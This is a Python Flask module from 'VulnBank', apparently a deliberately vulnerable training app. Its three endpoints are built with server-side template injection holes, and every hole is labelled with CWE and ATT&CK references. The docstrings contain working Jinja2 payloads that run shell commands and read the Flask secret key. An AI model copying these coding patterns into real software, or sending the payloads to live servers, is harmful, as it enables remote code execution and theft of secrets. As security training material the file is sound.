"""
VulnBank - Server-Side Template Injection (SSTI) vulnerabilities
CWE-94: Improper Control of Generation of Code ('Code Injection')

Vulnerabilities:
    - CWE-94: Jinja2 SSTI via render_template_string with user input
    - CWE-94: Python code execution via Jinja2 sandbox escape
    - CWE-200: Information disclosure via template context leak
    - CWE-78: OS command execution via SSTI -> subprocess
    - CWE-285: Unauthenticated access to admin template renderer

Security Framework Annotations:
    CWE:        CWE-94 (Code Injection / SSTI), CWE-200 (Info Disclosure),
                CWE-78 (OS Command Injection), CWE-285 (Improper Authorization)
    ATT&CK:     T1059.006 (Python), T1190 (Exploit Public-Facing Application)
    OWASP:      A03:2021 Injection
    PCI DSS:    Req 6.2.4 (protect against injection attacks including template injection)
    NIST:       SI-10 (Information Input Validation), SI-3 (Malicious Code Protection)
    SANS Top25: #17 (CWE-94 - Improper Control of Generation of Code)
    ISO 27001:  A.14.2.5 (Secure System Engineering Principles)

RCE Payload Examples:
    # {{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode() }}
    # {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
    # {{ ''.__class__.__mro__[1].__subclasses__()[-1].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
"""

from flask import Blueprint, request, jsonify
from flask import render_template_string

ssti_bp = Blueprint("ssti", __name__)


@ssti_bp.route("/api/template/render", methods=["GET"])
def render_name():
    """
    VULN: CWE-94 - User input interpolated into template string before Jinja2 parsing.

    Direct f-string interpolation means Jinja2 sees and executes any {{ }} syntax
    supplied by the attacker in the 'name' query parameter.

    Exploit:
        GET /api/template/render?name={{ 7*7 }}
        GET /api/template/render?name={{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
    """
    name = request.args.get("name", "World")
    # VULN: f-string interpolation before render_template_string — attacker controls Jinja2 template body
    template = f"Hello, {name}!"
    try:
        result = render_template_string(template)
        return jsonify({"rendered": result})
    except Exception as e:
        # VULN: CWE-200 - raw exception may reveal template internals
        return jsonify({"error": str(e)}), 400


@ssti_bp.route("/api/template/email", methods=["POST"])
def render_email():
    """
    VULN: CWE-94 - Attacker controls the full Jinja2 template string.

    The 'template' field is passed directly to render_template_string, giving
    the attacker complete control over the template body including Jinja2
    expressions, filters, and globals.

    Exploit body:
    {
        "template": "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode() }}",
        "context": {"user": "alice"}
    }

    RCE via config globals:
    {
        "template": "{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}",
        "context": {}
    }
    """
    body = request.get_json(force=True) or {}
    template = body.get("template", "")
    context = body.get("context", {})

    if not template:
        return jsonify({"error": "No template provided"}), 400

    try:
        # VULN: attacker-supplied template rendered without sandboxing
        result = render_template_string(template, **context)
        return jsonify({"rendered": result, "context_keys": list(context.keys())})
    except Exception as e:
        # VULN: CWE-200 - exception output may include evaluated expressions or internal paths
        return jsonify({"error": str(e)}), 400


@ssti_bp.route("/api/template/invoice", methods=["GET"])
def render_invoice():
    """
    VULN: CWE-94 - account_id from query string embedded in Jinja2 invoice template.

    The account_id parameter is used in a format string that is then rendered by
    Jinja2. If account_id contains Jinja2 syntax (e.g. {{ 7*7 }}), it is executed
    server-side during template rendering.

    Exploit:
        GET /api/template/invoice?account_id={{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode() }}
        GET /api/template/invoice?account_id={{ config.SECRET_KEY }}
    """
    account_id = request.args.get("account_id", "UNKNOWN")

    # VULN: account_id injected into template string — Jinja2 will evaluate any {{ }} in it
    invoice_template = f"""
    VulnBank Statement
    ==================
    Account: {account_id}
    Date: {{{{ now if now is defined else 'N/A' }}}}
    Balance: ${{{{ balance if balance is defined else '0.00' }}}}
    Status: Active
    """

    try:
        result = render_template_string(invoice_template, balance="1,500.00")
        return jsonify({"invoice": result, "account_id": account_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 400
